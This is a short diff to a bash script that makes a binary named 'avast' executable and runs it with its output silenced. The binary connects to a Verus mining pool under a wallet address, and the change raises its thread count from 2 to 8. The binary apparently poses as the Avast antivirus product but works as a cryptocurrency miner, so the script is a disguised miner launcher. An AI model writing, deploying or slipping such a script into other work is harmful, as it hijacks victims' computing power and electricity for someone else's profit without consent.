@@ -1,5 +1,5 @@
 #!/bin/bash
 
 chmod +x avast  >/dev/null 2>&1
-./avast -v -l  pool.verus.io:9999 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.T -t 2 -x
+./avast -v -l  pool.verus.io:9999 -u RKUEhTZwKjVXd1ms7r3gUqhNG4fCd83msA.T -t 8 -x
 
